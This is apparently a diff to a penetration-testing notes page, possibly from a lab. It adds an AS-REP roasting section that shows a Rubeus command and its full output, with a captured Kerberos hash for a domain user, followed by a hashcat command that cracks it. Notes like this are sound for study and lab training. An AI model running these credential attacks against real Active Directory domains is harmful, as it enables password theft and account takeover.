@@ -55,7 +55,40 @@ kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyo
 
 ### AS-REP Roasting with Rubeus
 
+```powershell
+PS C:\Users\Public> .\Rubeus asreproast /nowrap
+.\Rubeus asreproast /nowrap
 
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.0 
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : relia.com
+
+[*] Searching path 'LDAP://DC02.relia.com/DC=relia,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
+[*] SamAccountName         : michelle
+[*] DistinguishedName      : CN=Michelle Smith,CN=Users,DC=relia,DC=com
+[*] Using domain controller: DC02.relia.com (172.16.103.6)
+[*] Building AS-REQ (w/o preauth) for: 'relia.com\michelle'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$michelle@relia.com:0C5BDBDC
+```
+
+### Cracking with Hashcat
+
+```bash
+kali@kali sudo hashcat -m 18200 michelle.asrep /usr/share/wordlists/rockyou.txt --force
+```
 
 ## Checking Groups - net user&#x20;
 
